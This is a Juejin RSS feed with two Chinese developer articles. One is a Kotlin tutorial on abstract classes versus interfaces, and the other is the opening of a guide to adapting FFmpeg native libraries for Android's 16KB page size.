<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[kotlin抽象类（与接口的区别）]]></title>    <link>https://juejin.cn/post/7575106644499071010</link>    <guid>https://juejin.cn/post/7575106644499071010</guid>    <pubDate>2025-11-23T07:20:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644499071010" data-draft-id="7575112613777883170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin抽象类（与接口的区别）"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-23T07:20:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南雨北斗"/> <meta itemprop="url" content="https://juejin.cn/user/4059818590476286"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin抽象类（与接口的区别）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4059818590476286/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南雨北斗
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:20:55.000Z" title="Sun Nov 23 2025 07:20:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我们来详细探讨一下 Kotlin 中的抽象类。</p>
<p>在 Kotlin 中，<strong>抽象类</strong>是一种不能被直接实例化的类，其主要目的是作为其他类的基类（父类），用于定义通用的属性和方法，而将具体的实现细节留给子类。</p>
<h3 data-id="heading-0">1. 定义抽象类</h3>
<p>在 Kotlin 中，使用 <code>abstract</code> 关键字来声明一个抽象类。</p>
<p>kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 定义一个抽象类 Shape</span>
<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> {
    <span class="hljs-comment">// 抽象属性（没有初始化值，必须在子类中重写）</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> name: String

    <span class="hljs-comment">// 抽象方法（没有方法体，必须在子类中重写）</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateArea</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Double</span>

    <span class="hljs-comment">// 非抽象方法（有具体实现，可以被子类继承或重写）</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">printName</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"形状名称: <span class="hljs-variable">$name</span>"</span>)
    }
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>抽象类可以包含<strong>抽象属性</strong>和<strong>抽象方法</strong>，这些必须在子类中实现。</li>
<li>抽象类也可以包含<strong>非抽象属性</strong>和<strong>非抽象方法</strong>，这些会被子类继承。</li>
<li>抽象类<strong>不能被直接实例化</strong>，即不能使用 <code>val shape = Shape()</code>。</li>
</ul>
<hr/>
<h3 data-id="heading-1">2. 继承抽象类</h3>
<p>子类继承抽象类时，必须使用 <code>override</code> 关键字重写所有抽象属性和方法。</p>
<p>kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 子类 Circle 继承自抽象类 Shape</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span>(
    <span class="hljs-keyword">val</span> radius: <span class="hljs-built_in">Double</span>
) : Shape() {
    <span class="hljs-comment">// 重写抽象属性</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> name: String = <span class="hljs-string">"圆形"</span>

    <span class="hljs-comment">// 重写抽象方法</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateArea</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Double</span> {
        <span class="hljs-keyword">return</span> Math.PI * radius * radius
    }
}

<span class="hljs-comment">// 子类 Rectangle 继承自抽象类 Shape</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span>(
    <span class="hljs-keyword">val</span> width: <span class="hljs-built_in">Double</span>,
    <span class="hljs-keyword">val</span> height: <span class="hljs-built_in">Double</span>
) : Shape() {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> name: String = <span class="hljs-string">"矩形"</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateArea</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Double</span> {
        <span class="hljs-keyword">return</span> width * height
    }
}
</code></pre>
<p><strong>使用示例</strong>：</p>
<p>kotlin</p>
<pre><code class="hljs language-scss" lang="scss">fun <span class="hljs-selector-tag">main</span>() {
    val circle = Circle(<span class="hljs-number">5.0</span>)
    circle<span class="hljs-selector-class">.printName</span>() <span class="hljs-comment">// 输出：形状名称: 圆形</span>
    <span class="hljs-built_in">println</span>("面积: ${circle.calculateArea()}") <span class="hljs-comment">// 输出：面积: 78.5398...</span>

    val rectangle = <span class="hljs-built_in">Rectangle</span>(<span class="hljs-number">4.0</span>, <span class="hljs-number">6.0</span>)
    rectangle<span class="hljs-selector-class">.printName</span>() <span class="hljs-comment">// 输出：形状名称: 矩形</span>
    <span class="hljs-built_in">println</span>("面积: ${rectangle.calculateArea()}") <span class="hljs-comment">// 输出：面积: 24.0</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-2">3. 抽象类的特点</h3>
<ol>
<li>
<p><strong>不能实例化</strong>：</p>
<p>kotlin</p>
<pre><code class="hljs language-scss" lang="scss">val shape = <span class="hljs-built_in">Shape</span>() <span class="hljs-comment">// 错误：抽象类不能被实例化</span>
</code></pre>
</li>
<li>
<p><strong>可以包含抽象和非抽象成员</strong>：</p>
<ul>
<li>抽象成员（<code>abstract</code> 修饰）必须在子类中重写。</li>
<li>非抽象成员可以直接继承或被子类重写（使用 <code>override</code>）。</li>
</ul>
</li>
<li>
<p><strong>子类必须实现所有抽象成员</strong>：如果子类没有实现所有抽象属性和方法，那么子类也必须声明为抽象类。</p>
<p>kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span>(
    <span class="hljs-keyword">val</span> sideLength: <span class="hljs-built_in">Double</span>
) : Shape() {
    <span class="hljs-comment">// 只重写了抽象属性，没有重写抽象方法 calculateArea()</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> name: String = <span class="hljs-string">"正方形"</span>
    
    <span class="hljs-comment">// 因此 Square 类也必须是抽象的</span>
}
</code></pre>
</li>
<li>
<p><strong>抽象类可以继承其他类</strong>：抽象类可以继承自另一个非抽象类或抽象类。</p>
<p>kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">open</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
    <span class="hljs-keyword">open</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">makeSound</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"动物发出声音"</span>)
    }
}

<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> : <span class="hljs-type">Animal</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">makeSound</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 重写并声明为抽象方法，子类必须实现</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Puppy</span> : <span class="hljs-type">Dog</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">makeSound</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"小狗汪汪叫"</span>)
    }
}
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-3">4. 抽象类与接口的区别</h3>
<p>在 Kotlin 中，抽象类和接口（<code>interface</code>）都可以用于定义抽象行为，但它们有几个关键区别：</p>



































<table><thead><tr><th>特性</th><th>抽象类 (<code>abstract class</code>)</th><th>接口 (<code>interface</code>)</th></tr></thead><tbody><tr><td><strong>构造函数</strong></td><td>可以有构造函数</td><td>不能有构造函数（Kotlin 1.9+ 支持接口中定义带默认实现的属性，但仍不能有构造函数）</td></tr><tr><td><strong>多重继承</strong></td><td>只能单继承（一个类只能继承一个抽象类）</td><td>可以实现多个接口</td></tr><tr><td><strong>属性</strong></td><td>可以包含非抽象属性</td><td>接口中的属性默认是抽象的，或必须提供 getter 实现</td></tr><tr><td><strong>方法实现</strong></td><td>可以包含非抽象方法的实现</td><td>接口中的方法默认是抽象的，或必须提供实现（Kotlin 1.4+ 支持接口方法的默认实现）</td></tr><tr><td><strong>访问修饰符</strong></td><td>可以使用 <code>private</code>, <code>protected</code>, <code>public</code></td><td>接口成员默认是 <code>public</code>，不能有 <code>private</code> 修饰符</td></tr></tbody></table>
<p><strong>使用建议</strong>：</p>
<ul>
<li>如果需要定义一个通用的基类，并且需要包含构造函数、非抽象属性或方法，使用<strong>抽象类</strong>。</li>
<li>如果只是需要定义一组抽象行为（方法或属性），并且希望类可以实现多个这样的行为，使用<strong>接口</strong>。</li>
</ul>
<hr/>
<h3 data-id="heading-4">5. 总结</h3>
<ul>
<li>抽象类是用 <code>abstract</code> 关键字声明的类，不能被直接实例化。</li>
<li>抽象类可以包含抽象成员（必须在子类中重写）和非抽象成员（可以直接继承）。</li>
<li>子类继承抽象类时，必须重写所有抽象成员，否则子类也必须是抽象类。</li>
<li>抽象类适合作为具有共同属性和行为的类的基类，而接口适合定义多个类可以实现的抽象行为。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 16KB Page Size 适配实战流程：以重编译FFmpeg so库为例]]></title>    <link>https://juejin.cn/post/7575655132748316708</link>    <guid>https://juejin.cn/post/7575655132748316708</guid>    <pubDate>2025-11-23T08:25:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132748316708" data-draft-id="7575807729722441762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 16KB Page Size 适配实战流程：以重编译FFmpeg so库为例"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-11-23T08:25:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="在狂风暴雨中奔跑"/> <meta itemprop="url" content="https://juejin.cn/user/1841028550886683"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 16KB Page Size 适配实战流程：以重编译FFmpeg so库为例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1841028550886683/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    在狂风暴雨中奔跑
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:25:35.000Z" title="Sun Nov 23 2025 08:25:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Android 16KB Page Size 适配实战流程：以重编译FFmpeg so库为例</h2>
<h3 data-id="heading-1">前言</h3>
<p>为了优化了系统内存性能，谷歌计划将 Android 平台架构向 16KB Page Size（16384 字节内存页大小）迁移，这会导致许多仅支持4 KB 内存页面大小的依赖 C/C++ 原生库（.so 文件）的应用在 16KB AVD 或设备上遭遇加载崩溃。根据谷歌最新官方消息，自 2025 年 11 月 1 日起，提交到 Google Play 且以 Android 15 及更高版本为目标平台的所有新应用和现有应用更新都必须在 64 位设备上支持 16KB Page Size。 依赖 C/C++ 原生库（.so 文件）的应用没办法躲过适配16KB Page Size的工作了。<br/>
我手上的项目<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAudioAndVideoEditor" target="_blank" title="https://github.com/Ilovecat1949/AudioAndVideoEditor" ref="nofollow noopener noreferrer">AudioAndVideoEditor</a>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAeroFFmpeg" target="_blank" title="https://github.com/Ilovecat1949/AeroFFmpeg" ref="nofollow noopener noreferrer">AeroFFmpeg</a>均依赖FFmpeg so库且未适配16KB Page Size，适配16KB Page Size对于我而言也是一个很大的挑战。我本人也不是很懂 C/C++ 的编译底层原理，通过抄谷歌官方指导教程和大佬博客、问ai一路适配，最终应该是成功适配的了。<br/>
本文以重编译FFmpeg so库为例子讲诉适配流程：从判断是否支持16KB Page Size，到交叉编译so库，到重新编译构建整个项目，最终确保应用在最新的 16KB Android 环境中稳定运行。</p>
<h3 data-id="heading-2">适配难点</h3>
<p>虽然 16KB 适配对平台理论上有显著益处，但其大规模落地面临很大挑战。纯Java/Kolin项目理论上可以直接支持16KB Page Size设备，关键在于庞大的C/C++ 原生库生态。<br/>
1.源代码缺失或不可修改： 许多应用使用了多年前编译的、已停止维护的第三方 SDK 或原生库。如果无法获取源代码或修改其构建脚本，则根本无法重新编译并注入 16KB 链接器标志。<br/>
2.多层依赖嵌套： 复杂应用可能依赖的 A 库又依赖 B 库，而 B 库又依赖 C 库。只要依赖链中有一个库未适配，整个应用在 16KB 环境中就可能崩溃。<br/>
总之，没有 C/C++ 原生库就没有烦恼。<br/>
不同项目使用的 C/C++ 编译工具链和构建系统 不一样，涉及的原生库不一样，本文以<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAudioAndVideoEditor" target="_blank" title="https://github.com/Ilovecat1949/AudioAndVideoEditor" ref="nofollow noopener noreferrer">AudioAndVideoEditor</a>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAeroFFmpeg" target="_blank" title="https://github.com/Ilovecat1949/AeroFFmpeg" ref="nofollow noopener noreferrer">AeroFFmpeg</a>为例子介绍C/C++ 原生库适配16KB Page Size的流程。<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAudioAndVideoEditor" target="_blank" title="https://github.com/Ilovecat1949/AudioAndVideoEditor" ref="nofollow noopener noreferrer">AudioAndVideoEditor</a>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FIlovecat1949%2FAeroFFmpeg" target="_blank" title="https://github.com/Ilovecat1949/AeroFFmpeg" ref="nofollow noopener noreferrer">AeroFFmpeg</a>依赖的x264、x265、LAME、FFmpeg都是知名项目且代码开源，因此可以自己重新编译源码适配16KB Page Size，这一点是比较幸运的。我是先在Linux环境使用NDK r20交叉编译x264、x265、LAME、FFmpeg得到对应so库，再集成到Android项目里面使用CMake+NDK r25编译构建得到最终的Android应用和SDK库。重新编译so库的过程还是比较琐碎且耗时的。</p>
<h3 data-id="heading-3">判断你的应用是否满足16KB Page Size的要求</h3>
<p>16KB 适配最好安装新的Android Studio以使用谷歌提供的最新工具。虽然升级Android Studio可能会给老项目又带来一些问题，但是长痛不如短痛，升级Android Studio尽量跟上谷歌的步伐是最好的。</p>
<ol>
<li>使用Android Studio中的Analyze APK工具<br/>
在Android Studio打开项目，在最顶上菜单栏中，依次点击 Build &gt; Analyze APK...<br/>
如果你的 C/C++ 原生库已经适配 16KB ，结果如下：\</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1548376344c448e8e7e7d4544761ca0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zyo54uC6aOO5pq06Zuo5Lit5aWU6LeR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491135&amp;x-signature=pI%2F3%2FIBpjXdlk7hsBtLY7Pe0QMc%3D" alt="APP分析.jpg" loading="lazy"/></p>
<ol start="2">
<li>16 KB 虚拟机设备直接运行测试<br/>
arm64-v8a或x86_64的64位设备才有16KB Page Size的问题，我们可以在Android Studio的16KB 虚拟机上测试应用是否能正常运行。注意如果你是在AMD的Windows上开发，那你应该选择x86_64的16KB Page Size虚拟机，如果是ARM架构的Mac应该选择arm64-v8a的16KB Page Size虚拟机。<br/>
默认情况下，16KB Page Size虚拟机会使用16 KB 向后兼容模式，也就是说你的应用不支持16KB Page Size也不会一下崩掉，而是会弹出提示。\</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78b2360713364841bb279ca26feed160~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zyo54uC6aOO5pq06Zuo5Lit5aWU6LeR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491135&amp;x-signature=o%2ByA8OJ%2FH4eYZ50SV%2BwX%2B8FIu0M%3D" alt="未适配提示.jpg" loading="lazy"/></p>
<pre><code class="hljs">如果你想看看你的应用崩溃的样子，可以在应用设置里面选择关掉16 KB 向后兼容模式，报错信息如下。

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10d04a9c0e974d54bf47d86195aac2d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zyo54uC6aOO5pq06Zuo5Lit5aWU6LeR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491135&amp;x-signature=0x9QX%2BxdUYpme9ML5wrBY1xHNH8%3D" alt="报错.jpg" loading="lazy"/></p>
<h3 data-id="heading-4">适配16KB Page Size</h3>
<h4 data-id="heading-5">关键的链接器标志</h4>
